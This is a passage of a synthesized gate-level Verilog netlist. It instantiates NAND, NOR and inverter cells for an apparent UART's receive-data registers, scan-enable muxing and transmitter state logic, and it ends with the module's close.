  NAND2X0 U732 ( .IN1(rec_dataH_rec_6), .IN2(n586), .QN(n593) );
  NAND2X0 U733 ( .IN1(n587), .IN2(rec_dataH_rec_7), .QN(n592) );
  NAND2X0 U734 ( .IN1(n595), .IN2(n596), .QN(n149) );
  NAND2X0 U735 ( .IN1(rec_dataH_rec_6), .IN2(n443), .QN(n596) );
  NAND2X0 U736 ( .IN1(rec_dataH_temp_5), .IN2(test_se), .QN(n595) );
  NAND2X0 U737 ( .IN1(n597), .IN2(n598), .QN(n148) );
  NAND2X0 U738 ( .IN1(rec_dataH_temp_6), .IN2(n443), .QN(n598) );
  NAND2X0 U739 ( .IN1(rec_dataH_5_), .IN2(test_se), .QN(n597) );
  NAND3X0 U740 ( .IN1(n599), .IN2(n600), .IN3(n601), .QN(n147) );
  NAND2X0 U741 ( .IN1(rec_dataH_rec_4), .IN2(test_se), .QN(n601) );
  NAND2X0 U742 ( .IN1(rec_dataH_rec_5), .IN2(n586), .QN(n600) );
  NAND2X0 U743 ( .IN1(rec_dataH_rec_6), .IN2(n587), .QN(n599) );
  NAND2X0 U744 ( .IN1(n602), .IN2(n603), .QN(n146) );
  NAND2X0 U745 ( .IN1(rec_dataH_rec_5), .IN2(n443), .QN(n603) );
  NAND2X0 U746 ( .IN1(rec_dataH_temp_4), .IN2(test_se), .QN(n602) );
  NAND2X0 U747 ( .IN1(n604), .IN2(n605), .QN(n145) );
  NAND2X0 U748 ( .IN1(rec_dataH_temp_5), .IN2(n443), .QN(n605) );
  NAND2X0 U749 ( .IN1(rec_dataH_4_), .IN2(test_se), .QN(n604) );
  NAND3X0 U750 ( .IN1(n606), .IN2(n607), .IN3(n608), .QN(n143) );
  NAND2X0 U751 ( .IN1(rec_dataH_rec_3), .IN2(test_se), .QN(n608) );
  NAND2X0 U752 ( .IN1(rec_dataH_rec_4), .IN2(n586), .QN(n607) );
  NAND2X0 U753 ( .IN1(rec_dataH_rec_5), .IN2(n587), .QN(n606) );
  NAND2X0 U754 ( .IN1(n609), .IN2(n610), .QN(n142) );
  NAND2X0 U755 ( .IN1(rec_dataH_rec_4), .IN2(n443), .QN(n610) );
  NAND2X0 U756 ( .IN1(rec_dataH_temp_3), .IN2(test_se), .QN(n609) );
  NAND2X0 U757 ( .IN1(n611), .IN2(n612), .QN(n141) );
  NAND2X0 U758 ( .IN1(rec_dataH_temp_4), .IN2(n443), .QN(n612) );
  NAND2X0 U759 ( .IN1(rec_dataH_3_), .IN2(test_se), .QN(n611) );
  NAND3X0 U760 ( .IN1(n613), .IN2(n614), .IN3(n615), .QN(n140) );
  NAND2X0 U761 ( .IN1(rec_dataH_rec_2), .IN2(test_se), .QN(n615) );
  NAND2X0 U762 ( .IN1(rec_dataH_rec_3), .IN2(n586), .QN(n614) );
  NAND2X0 U763 ( .IN1(rec_dataH_rec_4), .IN2(n587), .QN(n613) );
  NAND2X0 U764 ( .IN1(n616), .IN2(n617), .QN(n139) );
  NAND2X0 U765 ( .IN1(rec_dataH_rec_3), .IN2(n443), .QN(n617) );
  NAND2X0 U766 ( .IN1(rec_dataH_temp_2), .IN2(test_se), .QN(n616) );
  NAND2X0 U767 ( .IN1(n618), .IN2(n619), .QN(n138) );
  NAND2X0 U768 ( .IN1(rec_dataH_temp_3), .IN2(n443), .QN(n619) );
  NAND2X0 U769 ( .IN1(rec_dataH_2_), .IN2(test_se), .QN(n618) );
  NAND3X0 U770 ( .IN1(n620), .IN2(n621), .IN3(n622), .QN(n136) );
  NAND2X0 U771 ( .IN1(rec_dataH_rec_1), .IN2(test_se), .QN(n622) );
  NAND2X0 U772 ( .IN1(rec_dataH_rec_2), .IN2(n586), .QN(n621) );
  NAND2X0 U773 ( .IN1(rec_dataH_rec_3), .IN2(n587), .QN(n620) );
  NAND2X0 U774 ( .IN1(n623), .IN2(n624), .QN(n135) );
  NAND2X0 U775 ( .IN1(rec_dataH_rec_2), .IN2(n443), .QN(n624) );
  NAND2X0 U776 ( .IN1(rec_dataH_temp_1), .IN2(test_se), .QN(n623) );
  NAND2X0 U777 ( .IN1(n625), .IN2(n626), .QN(n134) );
  NAND2X0 U778 ( .IN1(rec_dataH_temp_2), .IN2(n443), .QN(n626) );
  NAND2X0 U779 ( .IN1(rec_dataH_1_), .IN2(test_se), .QN(n625) );
  NAND3X0 U780 ( .IN1(n627), .IN2(n628), .IN3(n629), .QN(n133) );
  NAND2X0 U781 ( .IN1(rec_dataH_rec_0), .IN2(test_se), .QN(n629) );
  NAND2X0 U782 ( .IN1(rec_dataH_rec_1), .IN2(n586), .QN(n628) );
  NAND2X0 U783 ( .IN1(rec_dataH_rec_2), .IN2(n587), .QN(n627) );
  NAND2X0 U784 ( .IN1(n630), .IN2(n631), .QN(n132) );
  NAND2X0 U785 ( .IN1(rec_dataH_rec_1), .IN2(n443), .QN(n631) );
  NAND2X0 U786 ( .IN1(rec_dataH_temp_0), .IN2(test_se), .QN(n630) );
  NAND2X0 U787 ( .IN1(n632), .IN2(n633), .QN(n131) );
  NAND2X0 U788 ( .IN1(rec_dataH_temp_1), .IN2(n443), .QN(n633) );
  NAND2X0 U789 ( .IN1(rec_dataH_0_), .IN2(test_se), .QN(n632) );
  NAND3X0 U790 ( .IN1(n634), .IN2(n635), .IN3(n636), .QN(n129) );
  NAND2X0 U791 ( .IN1(test_se), .IN2(n721), .QN(n636) );
  NAND2X0 U792 ( .IN1(rec_dataH_rec_0), .IN2(n586), .QN(n635) );
  NAND2X0 U793 ( .IN1(rec_dataH_rec_1), .IN2(n587), .QN(n634) );
  NAND2X0 U794 ( .IN1(n637), .IN2(n638), .QN(n128) );
  NAND2X0 U795 ( .IN1(rec_dataH_rec_0), .IN2(n443), .QN(n638) );
  NAND2X0 U796 ( .IN1(rec_dataH_7_), .IN2(test_se), .QN(n637) );
  NAND2X0 U797 ( .IN1(n639), .IN2(n640), .QN(n127) );
  NAND2X0 U798 ( .IN1(rec_dataH_temp_0), .IN2(n443), .QN(n640) );
  NAND2X0 U799 ( .IN1(xmit_doneH_temp), .IN2(test_se), .QN(n639) );
  NAND3X0 U800 ( .IN1(n641), .IN2(n642), .IN3(n643), .QN(n126) );
  NAND2X0 U801 ( .IN1(n718), .IN2(test_se), .QN(n643) );
  NAND2X0 U802 ( .IN1(n722), .IN2(n644), .QN(n642) );
  INVX0 U803 ( .INP(n645), .ZN(n644) );
  NOR2X0 U804 ( .IN1(n646), .IN2(n647), .QN(n645) );
  NOR2X0 U805 ( .IN1(n537), .IN2(n648), .QN(n647) );
  NAND4X0 U806 ( .IN1(n648), .IN2(n587), .IN3(n717), .IN4(n428), .QN(n641) );
  NOR2X0 U807 ( .IN1(n413), .IN2(n416), .QN(n648) );
  NAND3X0 U808 ( .IN1(n649), .IN2(n650), .IN3(n651), .QN(n125) );
  NAND2X0 U809 ( .IN1(test_se), .IN2(rec_readyH_temp), .QN(n651) );
  NAND2X0 U810 ( .IN1(n652), .IN2(n717), .QN(n649) );
  INVX0 U811 ( .INP(n653), .ZN(n652) );
  NAND2X0 U812 ( .IN1(n654), .IN2(n655), .QN(n124) );
  NAND2X0 U813 ( .IN1(n717), .IN2(n656), .QN(n655) );
  NAND2X0 U814 ( .IN1(n443), .IN2(n657), .QN(n656) );
  NAND2X0 U815 ( .IN1(n658), .IN2(n413), .QN(n657) );
  NAND2X0 U816 ( .IN1(n719), .IN2(n646), .QN(n654) );
  NAND2X0 U817 ( .IN1(n653), .IN2(n650), .QN(n646) );
  NAND2X0 U818 ( .IN1(n587), .IN2(n421), .QN(n650) );
  NAND2X0 U819 ( .IN1(n659), .IN2(n660), .QN(n122) );
  NAND2X0 U820 ( .IN1(n719), .IN2(n661), .QN(n660) );
  NAND2X0 U821 ( .IN1(n443), .IN2(n662), .QN(n661) );
  NAND3X0 U822 ( .IN1(n658), .IN2(n416), .IN3(n717), .QN(n662) );
  NAND2X0 U823 ( .IN1(n718), .IN2(n663), .QN(n659) );
  NAND3X0 U824 ( .IN1(n664), .IN2(n665), .IN3(n653), .QN(n663) );
  NAND2X0 U825 ( .IN1(n586), .IN2(n581), .QN(n653) );
  NAND3X0 U826 ( .IN1(n238), .IN2(n716), .IN3(n241), .QN(n581) );
  NOR2X0 U827 ( .IN1(n658), .IN2(test_se), .QN(n586) );
  NAND2X0 U828 ( .IN1(n587), .IN2(n413), .QN(n665) );
  INVX0 U829 ( .INP(n537), .ZN(n587) );
  NAND2X0 U830 ( .IN1(n658), .IN2(n443), .QN(n537) );
  NAND3X0 U831 ( .IN1(n658), .IN2(n421), .IN3(n719), .QN(n664) );
  NOR2X0 U832 ( .IN1(iRECEIVER_state_0_), .IN2(n238), .QN(n658) );
  NAND2X0 U833 ( .IN1(n666), .IN2(n667), .QN(n121) );
  NAND2X0 U834 ( .IN1(n2), .IN2(n443), .QN(n667) );
  NOR2X0 U835 ( .IN1(n668), .IN2(n669), .QN(n2) );
  NAND2X0 U836 ( .IN1(test_se), .IN2(n700), .QN(n666) );
  NAND2X0 U837 ( .IN1(n670), .IN2(n671), .QN(n120) );
  NAND2X0 U838 ( .IN1(test_se), .IN2(iRECEIVER_state_2_), .QN(n671) );
  NAND2X0 U839 ( .IN1(n4), .IN2(n443), .QN(n670) );
  NAND3X0 U840 ( .IN1(n672), .IN2(n673), .IN3(n438), .QN(n119) );
  NAND3X0 U841 ( .IN1(n674), .IN2(n418), .IN3(n723), .QN(n438) );
  NAND3X0 U842 ( .IN1(n4), .IN2(n711), .IN3(n443), .QN(n673) );
  NOR2X0 U843 ( .IN1(n669), .IN2(n723), .QN(n4) );
  NAND2X0 U844 ( .IN1(test_se), .IN2(n723), .QN(n672) );
  NAND2X0 U845 ( .IN1(n675), .IN2(n676), .QN(n118) );
  NAND2X0 U846 ( .IN1(test_se), .IN2(n702), .QN(n676) );
  NAND2X0 U847 ( .IN1(n677), .IN2(n443), .QN(n675) );
  NAND3X0 U848 ( .IN1(n678), .IN2(n679), .IN3(n680), .QN(n677) );
  NAND2X0 U849 ( .IN1(xmit_dataH_0_), .IN2(n499), .QN(n680) );
  NAND2X0 U850 ( .IN1(n708), .IN2(n491), .QN(n679) );
  NOR2X0 U851 ( .IN1(n464), .IN2(n499), .QN(n491) );
  NAND2X0 U852 ( .IN1(n464), .IN2(n423), .QN(n678) );
  NOR2X0 U853 ( .IN1(n499), .IN2(n681), .QN(n464) );
  NOR2X0 U854 ( .IN1(n414), .IN2(n701), .QN(n681) );
  NOR2X0 U855 ( .IN1(n682), .IN2(n431), .QN(n499) );
  NAND2X0 U856 ( .IN1(n424), .IN2(n414), .QN(n431) );
  INVX0 U857 ( .INP(xmitH), .ZN(n682) );
  NAND2X0 U858 ( .IN1(n683), .IN2(n684), .QN(n117) );
  NAND2X0 U859 ( .IN1(uart_REC_dataH), .IN2(n443), .QN(n684) );
  NAND2X0 U860 ( .IN1(n716), .IN2(test_se), .QN(n683) );
  NAND2X0 U861 ( .IN1(n685), .IN2(n686), .QN(n115) );
  NAND2X0 U862 ( .IN1(n712), .IN2(n443), .QN(n686) );
  INVX0 U863 ( .INP(test_se), .ZN(n443) );
  NAND2X0 U864 ( .IN1(rec_dataH_rec_7), .IN2(test_se), .QN(n685) );
  NOR2X0 U865 ( .IN1(n687), .IN2(n669), .QN(n1) );
  INVX0 U866 ( .INP(n674), .ZN(n669) );
  NAND2X0 U867 ( .IN1(n432), .IN2(n465), .QN(n674) );
  NAND2X0 U868 ( .IN1(n703), .IN2(n460), .QN(n465) );
  NAND2X0 U869 ( .IN1(n483), .IN2(n701), .QN(n460) );
  NOR4X0 U870 ( .IN1(n422), .IN2(n415), .IN3(n418), .IN4(n723), .QN(n483) );
  NAND2X0 U871 ( .IN1(n701), .IN2(n702), .QN(n432) );
  NAND2X0 U872 ( .IN1(n688), .IN2(n689), .QN(iXMIT_N46) );
  NAND2X0 U873 ( .IN1(n704), .IN2(n690), .QN(n689) );
  NAND2X0 U874 ( .IN1(n691), .IN2(n430), .QN(n688) );
  NOR2X0 U875 ( .IN1(n692), .IN2(n691), .QN(iXMIT_N45) );
  INVX0 U876 ( .INP(n690), .ZN(n691) );
  NAND3X0 U877 ( .IN1(n715), .IN2(n714), .IN3(n713), .QN(n690) );
  NOR2X0 U878 ( .IN1(n713), .IN2(n693), .QN(n692) );
  NOR2X0 U879 ( .IN1(n417), .IN2(n412), .QN(n693) );
  NAND2X0 U880 ( .IN1(n694), .IN2(n695), .QN(iXMIT_N44) );
  NAND2X0 U881 ( .IN1(n714), .IN2(n417), .QN(n695) );
  NAND2X0 U882 ( .IN1(n715), .IN2(n412), .QN(n694) );
  INVX0 U883 ( .INP(n668), .ZN(iXMIT_N25) );
  NAND2X0 U884 ( .IN1(n696), .IN2(n450), .QN(n668) );
  INVX0 U885 ( .INP(n453), .ZN(n450) );
  NOR2X0 U886 ( .IN1(n697), .IN2(n415), .QN(n453) );
  NAND2X0 U887 ( .IN1(n415), .IN2(n697), .QN(n696) );
  INVX0 U888 ( .INP(n687), .ZN(iXMIT_N24) );
  NAND2X0 U889 ( .IN1(n698), .IN2(n697), .QN(n687) );
  NAND3X0 U890 ( .IN1(n700), .IN2(n711), .IN3(n723), .QN(n697) );
  NAND2X0 U891 ( .IN1(n422), .IN2(n699), .QN(n698) );
  NAND2X0 U892 ( .IN1(n723), .IN2(n711), .QN(n699) );
endmodule

